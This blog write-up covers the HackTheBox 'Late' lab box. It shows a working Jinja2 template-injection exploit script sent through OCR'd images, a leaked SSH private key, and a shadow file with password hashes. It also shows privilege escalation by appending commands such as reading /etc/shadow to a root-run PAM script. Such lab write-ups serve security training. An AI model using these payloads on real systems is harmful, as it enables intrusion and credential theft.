@@ -1,0 +1,388 @@
+#+setupfile: ../templates/level-0.org
+#+date: <2022-07-31 Sun>
+#+summary: Write-up for the easy box Late! A nice template injection where persistense is key to getting it right. With some incorrect permissions on a script that leads to ROOT!
+#+filetags: :HTB:write-up:hacking:
+#+title: HTB | Late
+* Introduction
+Welcome to this write-up for the Late box from HackTheBox.
+During the reconnaissance of this box, I found an ~nginx~ webserver with a virtual host.
+This virtual host was an image scanning service, that returned the text on the image as a text file.
+This service was vulnerable to Server Side Template Injection, shortened to SSTI, which was used to gain foothold using an exposed ssh private key.
+After enumerating the machine I found a script that activates on ssh connections, which due to some misconfiguration could be used to elevate privileges.
+* Recon
+** Nmap
+For recon I started with ~nmap~ to get a basic understanding of the machine.
+I started with scanning ALL the ports, so that I didn't miss anything that might be hiding outside the standard range.
+#+begin_example
+# Nmap 7.92 scan initiated Wed Apr 27 21:06:54 2022 as: nmap -p- -oA nmap/all_ports -v 10.129.227.134
+Nmap scan report for 10.129.227.134
+Host is up (0.23s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /nix/store/n5l0kx2fwaf2fp32a6xmk6hqx7vagimc-nmap-7.92/bin/../share/nmap
+# Nmap done at Wed Apr 27 21:26:34 2022 -- 1 IP address (1 host up) scanned in 1179.68 seconds
+#+end_example
+From this I found an open ~ssh~ port on 22, and a webserver on port 80.
+So I ran a version scan coupled with a default script scan on the two found ports.
+#+begin_example
+# Nmap 7.92 scan initiated Wed Apr 27 21:55:20 2022 as: nmap -sC -sV -p 22,80 -oA nmap/script_version_scan 10.129.227.134
+Nmap scan report for 10.129.227.134
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Late - Best online image tools
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Apr 27 21:55:35 2022 -- 1 IP address (1 host up) scanned in 14.86 seconds
+#+end_example
+From this we can see that the webserver is an ~nginx~ server, of version 1.14.0.
+And that the box is most likely running Ubuntu as OS, due to both the webserver header and the openssh version.
+** Web enumeration
+*** Manual enumeration
+The front page was rather simple, and hinted at some image utilities:
+[[file:assets/2022-04-27_22-04-06_screenshot.png]]
+
+Looking through the source of the page we have some hostname leak:
+[[file:assets/2022-04-27_22-07-20_screenshot.png]]
+
+I added both ~late.htb~ and ~images.late.htb~ to my ~/etc/hosts~.
+**** images.late.htb
+This page was quite interesting, as it scans images for text using some kind of optical character recognition aka ocr.
+[[file:assets/2022-04-28_19-08-12_screenshot.png]]
+
+I uploaded the above picture to see what the output from the server was:
+#+begin_example
+[c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ cat results.txt <p>Convert image
+to TEX Ere Flask
+
+If you want to turn an image into a text document, you came to
+the right place.
+
+Convert your image now!
+
+Choose file Browse
+
+</p>
+#+end_example
+
+It looks like it is put into some kind of ~html~ template.
+And since it's powered by ~flask~ I started testing for Server Side Template Injection targeting ~flask~'s template engine ~jinja2~.
+I created the following script to aid in the image creation process:
+#+begin_src python
+from PIL import Image, ImageDraw, ImageFont
+
+filename = "test.png"
+fnt = ImageFont.truetype("./arial sv/Arialn.ttf", 35)
+image = Image.new(mode="RGB", size=(200, 75), color="white")
+draw = ImageDraw.Draw(image)
+draw.text((10,10), " { { 7 * 7 } }", font=fnt,  fill=(0,0,0))
+image.save(filename)
+#+end_src
+The above snippet created this picture:
+[[file:assets/late_ssti_test.png]]
+
+Which returned the following result after uploading it to the server:
+#+begin_example
+[nix-shell:~/hacking/ctf/hackthebox/machines/late]$ cat result_ssti_proof.txt
+<p>49
+</p>
+#+end_example
+Confirming the SSTI vulnerability.
+*** Gobuster
+While I explored the website manually I ran ~gobuster~ in the background in case I missed anything.
+I didn't get the full command run for ~gobuster~, but I ran two different enumerations:
+ - Directory
+ - Virtual host
+
+Directory brute-force makes sense as it's a webserver, but the reason for searching for virtual hosts is because ~nginx~ is a reverse proxy.
+Which means it can redirect the request to different webservices on different local ports, using /virtual hosts/ by looking at the host header of the HTTP request.
+Instead of creating a real subdomain that points to a different IP address.
+
+**** Vhost enumeration
+For the enumeration of the virtual hosts I used ~subdomains-top1million-5000.txt~ from SecLists.
+Which only found got one hit:
+#+begin_example
+Found: images.late.htb (Status: 200) [Size: 2187]
+#+end_example
+
+**** Directory enumeration
+For the directories I used ~raft-small-words.txt~, with ~html~ and ~php~ as extensions, again from SecLists.
+Which found the following files and directories:
+#+begin_example
+/index.html           (Status: 200) [Size: 9461]
+/contact.html         (Status: 200) [Size: 6364]
+/assets               (Status: 301) [Size: 194] [--> http://10.129.227.134/assets/]
+/.                    (Status: 301) [Size: 194] [--> http://10.129.227.134/./]
+#+end_example
+
+I also ran ~gobuster~ on the subdomain found during the virtual host scan:
+#+begin_example
+/scanner              (Status: 500) [Size: 290]
+#+end_example
+
+So it turned out that I didn't miss anything during the manual exploration, but you can never be too certain.
+* Exploitation
+** Foothold
+The first thing you usually look at after confirming SSTI is the config object for flask:
+[[file:assets/late_ssti_config.png]]
+
+The above picture returned a file with the following text:
+#+begin_example
+[nix-shell:~/hacking/ctf/hackthebox/machines/late]$ cat result_config.txt
+<p>&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
+</p>
+#+end_example
+There is a lot of garbage in that called html entities normally used to prevent Cross Site Scripting attacks.
+After cleaning it up using we get the following:
+#+begin_example
+Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'_5#y2L"F4Q8z\n\xec]/', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}
+#+end_example
+In this there is a secret key!
+We got a secret key: ~b'_5#y2L"F4Q8z\n\xec]/'~
+
+This is usually used for encrypting/signing things such as JWT tokens.
+But since I essentially have Remote Code Execution on the server, I can run commands on the server with the following payload.
+[[file:assets/late_ssti_rce.png]]
+
+Which resulted in this:
+#+begin_example
+[c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ cat result_rce_whoami.txt
+<p>b&#39;svc_acc&#39;
+</p>
+#+end_example
+
+The OCR software is kinda unstable, gave a lot of errors because of characters being interpreted wrong.
+So I fiddled with the exploit for quite some time until I got this exploit pretty stable:
+#+begin_src python
+from PIL import Image, ImageDraw, ImageFont
+import requests
+import html
+import re
+import sys
+
+
+ssti_payload_1 = """
+{% for x  in  ()._ _class_ _. _ _base_ _.__subclasses__() %}
+{% if "warning"  in x.__name__ %}
+{{ x()._module.__builtins__["__import__"]("os" ).popen(request.args.cmd).read() }}
+{% endif %}
+{% endfor %}
+"""
+
+filename = "./ssti_pngs/rce.png"
+fnt = ImageFont.truetype("./arial sv/Arialn.ttf", 35)
+image = Image.new(mode="RGB", size=(2000, 400), color="white")
+draw = ImageDraw.Draw(image)
+draw.text((10,10), ssti_payload_1 , font=fnt,  fill=(0,0,0))
+image.save(filename)
+
+url = "http://images.late.htb/scanner?cmd="
+with open(filename, 'rb') as exploit:
+    files= {'file': ('rce.png', exploit, 'image/png')}
+
+    res = requests.post(url + sys.argv[1], files=files)
+    reslist = res.text.split('\n')
+    temp = []
+    for x in reslist:
+        if x != '':
+            temp.append(x)
+
+    result = '\n'.join(temp)
+    print(html.unescape(result))
+#+end_src
+Which is a sorta-kinda stable pseudo shell, atleast more stable than sitting and inserting spaces at random places until I got a useable result.
+
+I then started enumerating the server, and found this inside the ~.ssh~ folder:
+#+begin_example
+[nix-shell:~/hacking/ctf/hackthebox/machines/late]$ python create_img.py "ls ../.ssh"
+<p>
+authorized_keys
+id_rsa
+id_rsa.pub
+</p>
+
+#+end_example
+I then read the private key, pasted below, so that I could log in as ~svc_acc~.
+#+begin_example
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
+HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
+bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
+/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
+d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
+7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
+fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
+ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
+W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
+uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
+T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
+Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
+WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
+Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
+t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
+0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
+uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
+3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
+GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
+ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
+Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
+kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
+Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
+kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
+-----END RSA PRIVATE KEY-----
+#+end_example
+I threw that into a file called ~svc_rsa~ and set the correct permissions before connecting using ~ssh~:
+#+begin_example
+[c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late
+svc_acc@late:~$ ls
+app  user.txt
+svc_acc@late:~$ cat user.txt
+2ea1fc65fe52d80c26d8c800b8b354ee
+#+end_example
+And there is the user flag!
+** Priv esc
+I uploaded ~linpeas.sh~ to the server using ~scp~, to speedup enumeration for the privilege escalation.
+
+~linpeas.sh~ found this file in our path, which I (svc_acc) owned.
+#+begin_example
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+You own the script: /usr/local/sbin/ssh-alert.sh
+/usr/bin/gettext.sh
+#+end_example
+The script has the following content:
+#+begin_example
+svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+
+#+end_example
+
+The name and content of the script hints at what it does, but to find how it is executed I used a recursive ~grep~ call:
+#+begin_example
+svc_acc@late:~$ grep -r ssh-alert / 2>/dev/null
+/etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh
+^C
+svc_acc@late:~$
+#+end_example
+This means that the script is executed when an ~ssh~ session is created.
+It is executed by ~pam~ which is short for Privileged Access Management, and is what handles logins on linux.
+The ~pam~ daemon is run as root, meaning that it is the root user executing the script.
+The script I can change using ~vim~ or some other text editor... atleast I thought.
+
+It is protected by extended attributes, which we can check using ~getfacl~:
+#+begin_example
+svc_acc@late:/usr/local/sbin$ getfacl ssh-alert.sh
+# file: ssh-alert.sh
+# owner: svc_acc
+# group: svc_acc
+user::rwx
+group::r-x
+other::r-x
+#+end_example
+
+Even though we are the correct user and should have write permissions, we don't as our group doesn't have.
+
+There is another persmission which is not set... the append attribute!
+Due this not being handled in the file access control list (fACL) for the file, it is possible to append a command that will then be run as root!
+
+I tested this by appending a copy of the content of the ~/etc/shadow~ file, to see if I could read it:
+#+begin_example
+svc_acc@late:/usr/local/sbin$ echo 'cat /etc/shadow > /dev/shm/shadow_copy' >> ssh-alert.sh
+svc_acc@late:/usr/local/sbin$
+#+end_example
+
+And then just log in with a new ~ssh~ session to execute the script:
+#+begin_example
+[c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late.htb
+svc_acc@late:~$ ls /dev/shm/
+shadow_copy
+svc_acc@late:~$ cat /dev/shm/shadow_copy
+root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl/aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18997:0:99999:7:::
+svc_acc:$6$/WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9/MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7:::
+rtkit:*:18997:0:99999:7:::
+usbmux:*:18997:0:99999:7:::
+avahi:*:18997:0:99999:7:::
+cups-pk-helper:*:18997:0:99999:7:::
+saned:*:18997:0:99999:7:::
+colord:*:18997:0:99999:7:::
+pulse:*:18997:0:99999:7:::
+geoclue:*:18997:0:99999:7:::
+smmta:*:19006:0:99999:7:::
+smmsp:*:19006:0:99999:7:::
+#+end_example
+
+I tried to spawn a reverse shell using the same method, but without any luck.
+I think it might be because of some firewall rules that might be acting weird on after installing a new Operating System.
+
+Anyway I just read the content of the root flag using the same method as the shadow file:
+#+begin_example
+[c3lphie@laptop:~/hacking/ctf/hackthebox/machines/late]$ ssh -i svc_rsa svc_acc@late.htb
+svc_acc@late:~$ ls /dev/shm/
+root.txt     shadow_copy
+svc_acc@late:~$ ls /dev/shm
+root.txt  shadow_copy
+svc_acc@late:~$ cat /dev/shm/root.txt
+a4c40d0f0e0aaaead9bab6bd25200038
+svc_acc@late:~$
+
+#+end_example
+
+And there it is!
